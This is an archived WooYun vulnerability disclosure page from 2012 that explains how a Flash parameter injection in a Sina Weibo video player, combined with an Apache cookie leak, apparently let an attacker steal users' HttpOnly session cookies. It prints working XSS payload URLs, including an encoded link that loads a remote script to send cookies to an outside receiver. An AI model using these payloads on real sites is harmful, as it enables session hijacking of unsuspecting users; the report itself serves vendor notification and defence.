@@ -1,0 +1,336 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		新浪微博COOKIES盗取[flash编程安全+apache http-only cookie 泄漏利用]  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		新浪微博COOKIES盗取[flash编程安全+apache http-only cookie 泄漏利用]  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/gainover">gainover</a> 
+</li><li>提交时间：		2012-05-13 15:40</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2012-05-13：	细节已通知厂商并且等待厂商处理中<br/>
+									2012-05-14：	厂商已经确认，细节仅向厂商公开<br/>
+									2012-05-24：	细节向核心白帽子及相关领域专家公开<br/>
+									2012-06-03：	细节向普通白帽子公开<br/>
+									2012-06-13：	细节向实习白帽子公开<br/>
+									2012-06-27：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">我是公仔控啊！看到他们拿新浪的礼物了，眼馋！求礼物。求礼物！<br />
+<br />
+于是就投奔新浪了，辗转反侧了下，只捞到2个SQL注入的， 好不容易搞到管理员密码和后台，发现后台只能内网访问，可恶的10开头的IP！！<br />
+<br />
+然后就又回到微博了。 最近突然觉得，很多FLASH开发人员在编写的时候，忽视了安全问题。被恶意利用的话，可以实现URL跳转，COOKIES盗取，甚至是蠕虫攻击。<br />
+<br />
+FLASH编程安全问题导致的利用：http://www.wooyun.org/bugs/wooyun-2012-06103 （= = 自引用一次，哈哈，其实乌云上还有不少类似的例子的！！）<br />
+Apache Cookie 泄漏漏洞:http://www.wooyun.org/bugs/wooyun-2010-06947</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">漏洞测试： IE , firefox , chrome(= = 这个输入测试代码，浏览器直接崩溃了)<br />
+<br />
+<br />
+<br />
+漏洞成因：<br />
+<br />
+<br />
+<br />
+1. 首先说的是FLASH编程安全问题：<br />
+<br />
+<br />
+<br />
+    一些编程人员，对于loaderInfo.parameters 所传入的参数都不会严格过滤，甚至很多开发人员都有把Javascript函数名作为参数传入的习惯。 比如腾讯的QQ空间这个FLASH（ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2012-06103">WooYun: QQ空间存储型XSS漏洞（组合利用）</a>  ）。<br />
+<br />
+   而事实证明，新浪的开发人员也有类似的习惯。 <br />
+<br />
+<br />
+<br />
+2. 首先google 了一下 inurl:(swf) site:weibo.com ，将搜索结果中的SWF全部下载下来。 用ASV全部反编一下，得到若干txt文件，每个FLASH一个。<br />
+<br />
+<br />
+<br />
+3. 漏洞利用条件： 有parameters, 有 ExternalInterface.call。 我们以此2个关键词搜索上面得到的txt文件。<br />
+<br />
+<br />
+<br />
+4. 最终锁定一个目标。 http://tw.weibo.com/_common/jwplayer/player.swf<br />
+<br />
+<br />
+<br />
+5. 其漏洞源码如下：<br />
+<br />
+    //加载外部参数<br />
+<br />
+   this.loadFlashvars(RootReference.root.loaderInfo.parameters);<br />
+<br />
+   //写入参数<br />
+<br />
+    this.setConfigParam(param, params[param]);<br />
+<br />
+   //继续 ,可以看到参数写到了 _config 里<br />
+<br />
+    this._config[_arg1.toLowerCase()] = Strings.serialize(Strings.trim(_arg2));<br />
+<br />
+   //再搜索 ExternalInterface.call，找到以下位置<br />
+<br />
+    </p><pre><code>var callbacks:* = (_player.config.playerready) ? ((_player.config.playerready + &quot;,&quot;) + &quot;playerReady&quot;) : &quot;playerReady&quot;;<br />
+                if (ExternalInterface.available){<br />
+                    for each (callback in callbacks.replace(/\s/, &quot;&quot;).split(&quot;,&quot;)) {<br />
+                        try {<br />
+                            ExternalInterface.call(callback, {id:evt.id, client:evt.client, version:evt.version});<br />
+                        } catch(e:Error) {<br />
+                        };<br />
+                    };<br />
+                    clearQueuedEvents();<br />
+                };</code></pre><p class='detail'><br />
+<br />
+     //可以看出 call&lt;--callback&lt;--callbacks&lt;---_player.config.playerready<br />
+<br />
+<br />
+<br />
+6. 基于以上分析，我们可以很容易构造出利用代码。<br />
+<br />
+   <br />
+<br />
+  </p><pre><code>http://tw.weibo.com/_common/jwplayer/player.swf?playerready=(function(){alert(&#039;xxx&#039;);})</code></pre><p class='detail'> <br />
+<br />
+  <br />
+<br />
+7. 但是这样的代码，还不足以构成危害。 顶多就是一个URL跳转。 连cookies都是获取不到的。如以下代码，将返回[拒绝访问]的错误。<br />
+<br />
+<br />
+<br />
+http://tw.weibo.com/_common/jwplayer/player.swf?playerready=(function(){try{alert(document.cookie)}catch(e){alert(e.description)}})<br />
+<br />
+<br />
+<br />
+8. 突破限制，获取cookies。<br />
+<br />
+正好昨天在百度javascript吧看到一片帖子href,src的妙用（http://tieba.baidu.com/p/1583718448）。正好拿来突破这种限制了。<br />
+<br />
+(广告一下，喜欢javascript的可以经常来玩玩！！)。<br />
+<br />
+利用文章中所讲技巧，构造以下代码：<br />
+<br />
+<br />
+<br />
+http://tw.weibo.com/_common/jwplayer/player.swf?playerready=(function(){location.href=&#039;javascript:&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&#039;})<br />
+<br />
+<br />
+<br />
+9. 从上面可以看出，弹出weibo.com的cookies里。但是当我拿这个cookies来发送微博的时候，发现不成功。 比较了一下获取的cookies，发现SUS，SUE两个值是http-only的，也就是document.cookie得不到的。<br />
+<br />
+<br />
+<br />
+10. 前些天看到有人发腾讯的apache cookie 泄漏漏洞，结果因为没有漏洞利用场景被忽略了。看了下tw.weibo.com的HTTP头，正好是apache的，我们这里可以尝试用一用了！！<br />
+<br />
+从exploit-db下载了利用的JS，做了点小修改。如下，保存为 http://appmaker.sinaapp.com/test3.js <br />
+<br />
+<br />
+<br />
+11. 构造以下利用代码，调用上面这个JS文件。代码中的test.php为接收cookies的文件。<br />
+<br />
+</p><pre><code>http://tw.weibo.com/_common/jwplayer/player.swf?playerready=(function(){location.href=&#039;javascript:&quot;&lt;script/src=\&#039;//appmaker.sinaapp.com\/test3.js\&#039;&gt;&lt;/script&gt;&quot;&#039;})</code></pre><p class='detail'><br />
+<br />
+编码一下，可以发到微博： <br />
+<br />
+</p><pre><code>http://tw.weibo.com/_common/jwplayer/player.swf?playerready=(function()%7Blocation.href%3D&#039;javascript%3A%22%3Cscript%2Fsrc%3D%5C&#039;%2F%2Fappmaker.sinaapp.com%5C%2Ftest3.js%5C&#039;%3E%3C%2Fscript%3E%22&#039;%7D)</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+12. 结果表明该服务器存在apache cookies泄漏漏洞，效果见漏洞证明。<br />
+<br />
+<br />
+<br />
+------------------------------------------------------------<br />
+<br />
+<br />
+<br />
+总结：<br />
+<br />
+<br />
+<br />
+1. FLASH的编写安全不容忽视，实际上，我找到了10多个FLASH中，有2个FLASH可以被利用到。这说明这种漏洞不是偶然，而是被开发者忽略掉的一个问题。<br />
+<br />
+<br />
+<br />
+另外一个不在weibo.com的域名下。提供给你们一起修复下吧!<br />
+<br />
+<br />
+<br />
+http://js.t.sinajs.cn/t4/home/static/swf/img/SinaCollage.swf?JSHandler=(function(){alert(&#039;xxx&#039;)})<br />
+<br />
+<br />
+<br />
+2. 本流程为apache cookies泄漏漏洞的利用，提供了一个利用场景。 </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">1. 微博写入链接：<br />
+<br />
+</p><p class="detail"><a href="../images/13151749106fd8cbb706de62bc68d52d2cb64052.jpg" target="_blank"><img src="../images/13151749106fd8cbb706de62bc68d52d2cb64052.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+2. 点击链接后，抓包，见图<br />
+<br />
+<br />
+<br />
+   A. Apache cookies 泄漏图，其中包含有document.cookie无法获取到的SUS,SUE<br />
+<br />
+   </p><p class="detail"><a href="../images/13152408b9dbf593c8f71d53a9c916a05f562055.jpg" target="_blank"><img src="../images/13152408b9dbf593c8f71d53a9c916a05f562055.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+  B. 可以看到Cookies被转发到我们指定的PHP文件中。<br />
+<br />
+   </p><p class="detail"><a href="../images/13152503e97c3c04eb84bb049e2f884e9f1ee6a2.jpg" target="_blank"><img src="../images/13152503e97c3c04eb84bb049e2f884e9f1ee6a2.jpg" alt="" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+3. 利用Cookies在SAE发送微博失败。。 提示是 <br />
+<br />
+“抱歉，你当前使用的账号、IP或应用由于违反了新浪微博的安全检测规则，暂时无法完成此操作啦。你可以绑定手机来取消此限制，如有问题@微博客服反馈。” 可能做了某些其他限制。<br />
+<br />
+<br />
+<br />
+ </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">1. 审查已上线的FLASH文件代码，严格控制FLASH文件参数的输入<br />
+<br />
+2. apache的漏洞给打补丁。 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/gainover" title="gainover">gainover</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-07050" title="新浪微博COOKIES盗取[flash编程安全+apache http-only cookie 泄漏利用]">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2012-05-14 05:16</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感谢gainover的详尽挖掘和分析，我们尽快修复并查找类似问题</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="7050";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
